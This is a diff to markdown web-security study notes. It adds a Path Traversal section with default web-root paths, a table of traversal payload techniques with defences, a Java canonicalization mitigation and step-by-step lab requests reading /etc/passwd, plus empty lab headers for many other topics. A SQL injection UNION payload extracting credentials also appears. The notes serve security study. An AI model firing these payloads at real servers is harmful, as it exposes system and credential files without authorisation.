@@ -11,11 +11,17 @@
 - [SQL Injection](#sql-injection)
   - [Lab](#sql-injection-lab)
 - [Path Traversal](#path-traversal)
+  - [Lab](#path-traversal-lab)
 - [Authentication](#authentication)
+  - [Lab](#authentication-lab)
 - [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
+  - [Lab](#business-logic-vulnerabilities-lab)
 - [Command Injection](#command-injection)
+  - [Lab](#command-injection-lab)
 - [Information Disclosure](#information-disclosure)
+  - [Lab](#information-disclosure-lab)
 - [Access Control](#access-control)
+  - [Lab](#access-control-lab)
 - [File Upload](#file-upload)
 - [Race Condition](#race-condition)
 - [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
@@ -207,85 +213,197 @@
       `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
 
 ## Path Traversal
-Content for Path Traversal...
+**Default root directories**
+| Web Server         | Operating System     | Default Root Directory      |
+|--------------------|----------------------|-----------------------------|
+| Apache HTTP Server | Linux                | `/var/www/html`             |
+|                    | Debian/Ubuntu        | `/var/www/html`             |
+|                    | CentOS/RHEL          | `/var/www/html`             |
+|                    | Fedora               | `/var/www/html`             |
+|                    | SUSE/openSUSE        | `/srv/www/htdocs`           |
+| Nginx              | Linux                | `/usr/share/nginx/html`     |
+|                    | Debian/Ubuntu        | `/var/www/html`             |
+|                    | CentOS/RHEL          | `/usr/share/nginx/html`     |
+|                    | Fedora               | `/usr/share/nginx/html`     |
+|                    | SUSE/openSUSE        | `/srv/www/htdocs`           |
+| Microsoft IIS      | Windows Server       | `C:\inetpub\wwwroot`        |
+| Apache Tomcat      | Cross-platform       | `/var/lib/tomcat/webapps`   |
+
+**OS folder directory**  
+- Linux forward slash: `../../../etc/passwd`
+- Windows backslash: `..\..\..\windows\win.ini`
+
+**Techniques**
+| Technique                   | Description                                                                 | Example                         | Defense Strategy                                                                 |
+|-----------------------------|-----------------------------------------------------------------------------|---------------------------------|----------------------------------------------------------------------------------|
+| Dot-Dot-Slash (`../`)       | Traverses up one directory level relative to the current directory          | `../../../../etc/passwd`        | Input validation, normalize paths, restrict access to known directories            |
+| Encoded Characters          | Uses URL encoding (%2e%2e%2f) to obfuscate traversal sequences              | `..%252f..%252fetc/passwd`      | Decode URL parameters, enforce strict input validation                            |
+| Absolute Path Traversal     | Directly accesses files using absolute paths                                | `/etc/passwd`                   | Validate input against allowed directories, avoid user-controlled absolute paths  |
+| Null Byte (%00)             | Terminates string interpretation, bypasses file extension restrictions      | `../../../etc/passwd%00.jpg`    | Filter out null bytes, enforce strict input validation                            |
+| Unicode/UTF-8 Encoding      | Uses encoded Unicode characters to represent traversal sequences            | `..%c0%af..%c0%afetc/passwd`    | Normalize Unicode characters, validate and sanitize input                         |
+| Double URL Encoding         | Encodes characters multiple times to bypass input filters                   | `..%252e%252e%252fetc/passwd`   | Decode multiple times, validate and sanitize input                                |
+| Alternative Data Streams    | Exploits NTFS file system feature to access hidden data streams             | `file.txt::$DATA`               | Restrict access to filesystem features, sanitize input parameters                 |
+| Bypass Normalization        | Exploits differences in path normalization algorithms                      | `..\/..\/etc/passwd`            | Use consistent path normalization routines, sanitize and validate input           |
+
+**Mitigation**  
+- Input validation and sanitization (validate input, reject unsafe chrs, use whitelist)
+- Canonicalization of Paths  
+  ```Java
+  File file = new File(BASE_DIRECTORY, userInput);
+  if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    // process file
+  } 
+  ```
+- Allowlisting for file inclusion and access
+- Configure server settings to disallow remote file inclusion and limit the ability of scripts to access the filesystem. PHP `allow_url_fopen` `allow_url_include`
+
+
+### Path Traversal Lab  
+1. File path traversal, simple case
+   - check for image request traffic: Use **burp site map filter**-->check '**Images**'-->Apply
+   - GET /image?filename=`../../../../etc/passwd`
+3. File path traversal, traversal sequences blocked with **absolute path bypass**
+   - GET /image?filename=`/etc/passwd`
+5. File path traversal, traversal sequences **stripped non-recursively**
+   - GET /image?filename=`....//....//....//etc/passwd` (bypass blacklist `../`)
+7. File path traversal, traversal sequences **stripped with superfluous URL-decode**
+   - **URL encoding** %2f: `..%2f..%2f..%2fetc/passwd`
+   - **URL double encoding** %252f: `..%252f..%252f..%252fetc%252fpasswd`
+9. File path traversal, validation of **start of path**
+    - GET /image?filename=`/var/www/images/../../../etc/passwd`
+11. File path traversal, validation of **file extension with null byte bypass**
+    - GET /image?filename=`../../../etc/passwd%00.png`
 
 ## Authentication
 Content for Authentication...
 
+### Authentication Lab
+
 ## Business Logic Vulnerabilities
 Content for Business Logic Vulnerabilities...
+
+### Business Logic Vulnerabilities Lab
 
 ## Command Injection
 Content for Command Injection...
 
+### Command Injection Lab
+
 ## Information Disclosure
 Content for Information Disclosure...
+
+### Information Disclosure Lab
 
 ## Access Control
 Content for Access Control...
 
+### Access Control Lab
+
 ## File Upload
 Content for File Upload...
+
+### File Upload Lab
 
 ## Race Condition
 Content for Race Condition...
 
+### Race Condition Lab
+
 ## SSRF (Server-Side Request Forgery)
 Content for SSRF...
+
+### SSRF Lab
 
 ## NoSQL Injection
 Content for NoSQL Injection...
 
+### NoSQL Injection Lab
+
 ## XXE Injection
 Content for XXE Injection...
+
+### XXE Injection Lab
 
 ## API
 Content for API...
 
+### API Lab
+
 ## CSRF (Cross-Site Request Forgery)
 Details about CSRF...
+
+### CSRF Lab
 
 ## XSS (Cross-Site Scripting)
 Details about XSS...
 
+### XSS Lab
+
 ## CORS (Cross-Origin Resource Sharing)
 Details about CORS...
+
+### CORS Lab
 
 ## Clickjacking
 Details about Clickjacking...
 
+### Clickjacking Lab
+
 ## DOM-based Attacks
 Details about DOM-based attacks...
+
+### DOM-based Attacks Lab
 
 ## WebSockets
 Details about WebSockets...
 
+### WebSockets Lab
+
 ## Insecure Deserialization
 Content for Insecure Deserialization...
+
+### Insecure Deserialization Lab
 
 ## Web LLM Attacks
 Content for Web LLM Attacks...
 
+### Web LLM Attacks Lab
+
 ## GraphQL API
 Content for GraphQL API...
+
+### GraphQL API Lab
 
 ## Server-side Template Injection
 Content for Server-side Template Injection...
 
+### Server-side Template Injection Lab
+
 ## Web Cache Poisoning
 Content for Web Cache Poisoning...
+
+### Web Cache Poisoning Lab
 
 ## HTTP Host Header
 Content for HTTP Host Header...
 
+### HTTP Host Header Lab
+
 ## OAuth Authentication
 Content for OAuth Authentication...
+
+### OAuth Authenticatio Lab
 
 ## JWT Attacks
 Content for JWT Attacks...
 
+### JWT Attacks Lab
+
 ## Prototype Pollution
 Content for Prototype Pollution...
 
+### Prototype Pollution Lab
+
 ## Essential Skills
 Content for Essential Skills...
+
